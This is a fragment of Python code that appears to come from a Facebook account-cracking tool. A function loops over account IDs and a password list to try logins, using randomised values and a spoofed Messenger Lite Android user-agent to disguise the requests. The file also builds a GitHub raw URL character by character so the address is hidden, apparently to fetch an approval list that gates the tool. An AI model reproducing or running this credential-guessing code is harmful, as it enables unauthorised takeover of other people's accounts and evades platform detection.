...
def api1(ids,names,passlist):
                global ok,loop
                        ...
                        for pas in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = "Davik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/304.0.0.2.143;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/838615178;FBCR/Jazz;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"
...
#=====================Raw
ID = ['h','t','t','p','s',':','/','/','r','a','w','.','g','i','t','h','u','b','u','s','e','r','c','o','n','t','e','n','t','.','c','o','m','/','K','I','N','G','F','A','T','H','E','R','7','8','6','/','O','l','d','.','p','y','/','m','a','i','n','/','A','p','p','r','o','v','a','l','.','t','x','t']
XDI = ''.join(ID)
